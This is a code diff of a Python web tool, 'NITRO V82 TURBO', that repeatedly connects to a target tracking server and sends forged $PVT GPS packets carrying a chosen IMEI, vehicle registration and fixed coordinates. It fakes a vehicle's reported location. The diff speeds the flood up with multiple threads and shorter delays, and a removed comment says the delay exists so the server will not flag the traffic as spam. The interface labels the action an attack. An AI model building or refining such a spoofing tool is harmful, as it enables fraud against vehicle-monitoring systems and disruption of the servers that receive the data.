@@ -25,42 +25,37 @@ def format_coord(val):
     p = str(val).split('.')
     return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"
 
-# --- SEQUENTIAL HANDSHAKE ENGINE ---
-def start_firing(imei, vno, lat, lon):
+# --- TURBO SEQUENTIAL ENGINE ---
+def handshake_worker(tag_list, imei, vno, lat, lon):
     global firing, total_sent, logs
     while firing:
-        for tag in TAGS:
+        for tag in tag_list:
             if not firing: break
             try:
-                # 1. Establish Handshake (New Connection per Tag)
+                # Per-tag handshake logic (As requested)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)
+                s.settimeout(7)
                 s.connect((TARGET_IP, TARGET_PORT))
                 
-                # 2. Prepare Valid Packet
                 now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                 dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
+                
                 pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
                 
-                # 3. Send & Wait for Buffer Clearance
                 s.sendall(bytes(pkt, 'ascii'))
                 total_sent += 1
+                s.close() # Handshake complete
                 
-                # 4. Graceful Close (Completes Handshake)
-                s.close()
-                
-                logs.append(f"[{tm}] {tag} -> HANDSHAKE_OK")
+                logs.append(f"[{tm}] {tag} -> TURBO_OK")
                 if len(logs) > 8: logs.pop(0)
                 
-                # Chhota delay taaki server spam na samjhe
-                time.sleep(0.5) 
-            except Exception as e:
-                logs.append(f"ERR: {tag} - RECONNECTING")
+                # Speed optimized delay (0.1s instead of 0.5s)
+                time.sleep(0.1) 
+            except:
                 time.sleep(1)
 
 @app.get("/", response_class=HTMLResponse)
 async def home():
-    # UI Code remains same as before for consistency
     return """
     <html><head><title>NITRO V82 PRO</title><style>
     body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
@@ -71,10 +66,10 @@ async def home():
     #log { height:150px; background:#001100; border:1px dotted #0f0; margin-top:15px; padding:10px; font-size:12px; overflow:hidden; }
     </style></head><body>
     <div class="box">
-        <h2>NITRO V82 PRO</h2>
+        <h2>NITRO V82 TURBO</h2>
         <input type="text" id="v" value="UP51T8261"><input type="text" id="i" value="358980101447242">
         <input type="text" id="lt" value="25.6501550"><input type="text" id="ln" value="84.7851780">
-        <button onclick="st()">START SEQUENTIAL ATTACK</button>
+        <button onclick="st()">START TURBO SEQUENTIAL</button>
         <button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT</button>
         <div id="log">SYSTEM READY</div>
         <div style="margin-top:10px;">SENT: <b id="c">0</b></div>
@@ -94,7 +89,10 @@ async def home():
 @app.get("/init")
 def init(v:str, i:str, lt:str, ln:str):
     global firing, total_sent; firing=True; total_sent=0
-    threading.Thread(target=start_firing, args=(i, v.upper(), lt, ln), daemon=True).start()
+    # Splitting into 3 workers to speed up while keeping the handshake process
+    chunks = [TAGS[x:x+5] for x in range(0, len(TAGS), 5)]
+    for c in chunks:
+        threading.Thread(target=handshake_worker, args=(c, i, v.upper(), lt, ln), daemon=True).start()
     return {"ok":True}
 
 @app.get("/stop")
